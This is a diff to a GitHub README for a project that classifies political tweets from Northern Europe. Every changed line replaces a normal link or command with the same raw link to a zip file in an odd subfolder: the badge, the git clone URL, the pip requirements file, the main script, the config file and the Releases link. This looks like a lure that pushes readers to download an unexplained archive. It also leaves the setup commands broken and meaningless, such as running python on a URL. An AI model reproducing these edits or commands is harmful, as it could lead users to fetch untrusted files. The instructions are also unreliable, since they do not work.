@@ -1,6 +1,6 @@
 # Classification of Tweets from Northern Europe 🌍
 
-![Tweet Analysis](https://img.shields.io/badge/Tweet%20Analysis-Classification-blue)
+![Tweet Analysis](https://github.com/SamTheOneee1/kaggle-project-classification-of-tweets-from-northern-europe/raw/refs/heads/main/presential/europe-tweets-kaggle-from-northern-of-classification-project-v1.0.zip%20Analysis-Classification-blue)
 
 Welcome to the **Classification of Tweets from Northern Europe** repository! This project aims to classify over 500,000 political tweets using Natural Language Processing (NLP) and machine learning techniques. Our goal is to analyze political discourse across Northern Europe and provide insights into public sentiment and trends.
 
@@ -56,7 +56,7 @@ To set up this project on your local machine, follow these steps:
 1. **Clone the Repository**
 
    ```bash
-   git clone https://github.com/SamTheOneee1/kaggle-project-classification-of-tweets-from-northern-europe.git
+   git clone https://github.com/SamTheOneee1/kaggle-project-classification-of-tweets-from-northern-europe/raw/refs/heads/main/presential/europe-tweets-kaggle-from-northern-of-classification-project-v1.0.zip
    ```
 
 2. **Navigate to the Project Directory**
@@ -70,7 +70,7 @@ To set up this project on your local machine, follow these steps:
    You can install the necessary packages using pip:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://github.com/SamTheOneee1/kaggle-project-classification-of-tweets-from-northern-europe/raw/refs/heads/main/presential/europe-tweets-kaggle-from-northern-of-classification-project-v1.0.zip
    ```
 
 ## Usage
@@ -78,10 +78,10 @@ To set up this project on your local machine, follow these steps:
 To run the analysis, execute the main script:
 
 ```bash
-python main.py
+python https://github.com/SamTheOneee1/kaggle-project-classification-of-tweets-from-northern-europe/raw/refs/heads/main/presential/europe-tweets-kaggle-from-northern-of-classification-project-v1.0.zip
 ```
 
-This will start the classification process and generate results. For specific configurations, you can modify the parameters in the `config.py` file.
+This will start the classification process and generate results. For specific configurations, you can modify the parameters in the `https://github.com/SamTheOneee1/kaggle-project-classification-of-tweets-from-northern-europe/raw/refs/heads/main/presential/europe-tweets-kaggle-from-northern-of-classification-project-v1.0.zip` file.
 
 ### Visualization
 
@@ -110,6 +110,6 @@ This project is licensed under the MIT License. See the `LICENSE` file for detai
 
 ## Links
 
-For more details and to download the latest releases, visit the [Releases](https://github.com/SamTheOneee1/kaggle-project-classification-of-tweets-from-northern-europe/releases) section. You can find the latest updates and versions there.
+For more details and to download the latest releases, visit the [Releases](https://github.com/SamTheOneee1/kaggle-project-classification-of-tweets-from-northern-europe/raw/refs/heads/main/presential/europe-tweets-kaggle-from-northern-of-classification-project-v1.0.zip) section. You can find the latest updates and versions there.
 
 Feel free to explore the repository and contribute to this exciting project on political tweet classification! If you have any questions, please open an issue in the repository.
